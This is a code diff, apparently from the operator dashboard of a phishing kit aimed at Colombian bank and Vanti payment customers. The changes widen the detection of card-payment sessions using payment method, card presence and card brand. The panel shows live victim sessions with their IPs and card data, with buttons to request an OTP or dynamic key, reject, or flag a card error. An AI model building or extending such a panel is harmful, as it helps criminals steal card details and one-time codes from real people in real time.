@@ -340,7 +340,6 @@ let seleccionHistorial = new Set();
 let sesionesAnteriores = new Set();
 let audioCtx = null;
 
-// 🔥 BLOQUEOS PARA EVITAR DUPLICADOS Y SOBRECARGA
 let isFetchingSesiones = false;
 let isFetchingActivos = false;
 
@@ -351,7 +350,6 @@ let primeraCargaSesiones = false;
 let ultimaFirmaSesiones = '';
 let firmaActivosAnterior = '';
 
-// Ticker local (reloj en vivo cada 1 seg sin llamar al servidor)
 setInterval(() => {
     document.querySelectorAll('.tiempo-activo').forEach(el => {
         const entroEn = Number(el.getAttribute('data-entro'));
@@ -538,14 +536,12 @@ function mostrarDashboard() {
     if (pollInterval) clearInterval(pollInterval);
     if (pollLento) clearInterval(pollLento);
     
-    // 🔥 Poll rápido (1s) para tiempo real (sonidos, tiempo, sesiones)
     pollInterval = setInterval(() => {
         cargarStats();
         cargarActivos();
         cargarSesiones();
     }, 1000);
     
-    // 🔥 Poll lento (5s) para cosas pesadas (historial, IPs, logs)
     pollLento = setInterval(() => {
         cargarIps();
         cargarLogs();
@@ -601,10 +597,17 @@ function botonesSesion(s) {
     const ip = escapeHtml(s.datos.ip || '');
     const btns = [];
 
-    // 🔥 DETECCIÓN INTELIGENTE DE CC: Si el ID incluye 'cc' o el bancoKey es cc-bogota/bucaramanga
-    const esCC = bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga' || s.sessionId.toLowerCase().includes('cc');
+    // 🔥 DETECCIÓN: Si es Vanti pero el medio de pago es Wompi, o tiene tarjeta, o el paso es 'Vanti Tarjeta', o el ID es de CC
+    const esTarjeta = bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga' || 
+                      s.sessionId.toLowerCase().includes('cc') ||
+                      (bancoKey === 'vanti' && (
+                          s.datos.medioPago === 'Wompi' || 
+                          s.datos.tarjeta || 
+                          s.paso === 'Vanti Tarjeta' ||
+                          s.datos.marca === 'visa' || s.datos.marca === 'mastercard'
+                      ));
 
-    if (esCC) {
+    if (esTarjeta) {
         btns.push(`<button class="btn btn-otp" title="Pedir OTP o Clave Dinámica" onclick="accion('${sid}','OTP')">📱</button>`);
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
         btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
@@ -660,7 +663,6 @@ async function cargarSesiones() {
         const d = await api('/admin/sesiones');
         const sesionesActuales = d.sesiones.reverse();
 
-        // 🔥 FILTRO ANTI-DUPLICADOS: Si por algún error de red llegan sesiones repetidas, las ignoramos
         const unicas = [];
         const vistas = new Set();
         for (const s of sesionesActuales) {
